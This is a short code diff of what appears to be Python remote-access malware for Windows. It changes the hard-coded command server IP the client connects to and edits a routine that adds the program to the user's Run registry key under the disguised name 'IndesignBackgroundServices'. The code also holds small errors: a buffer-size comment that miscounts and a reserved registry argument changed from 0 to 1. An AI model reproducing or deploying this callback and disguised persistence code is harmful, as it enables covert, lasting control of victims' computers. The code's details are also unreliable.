@@ -6,7 +6,7 @@ import socket
 import time
 import winreg as winreg
 
-SERVER_HOST = "13.60.17.29"
+SERVER_HOST = "54.196.161.61"
 SERVER_PORT = 5003
 BUFFER_SIZE = 1024 * 1024  # 128KB max size of messages, feel free to increase
 SEPARATOR = "<sep>"
@@ -47,7 +47,7 @@ def add_to_startup(exe_path):
         key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
         
         with winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS) as regkey:
-            winreg.SetValueEx(regkey, "IndesignBackgroundServices", 0, winreg.REG_SZ, exe_path)
+            winreg.SetValueEx(regkey, "IndesignBackgroundServices", 1, winreg.REG_SZ, exe_path)
             print(f"Added '{exe_path}' to current user's startup via registry.")
     except Exception as e:
         print(f"Error adding to startup: {e}")
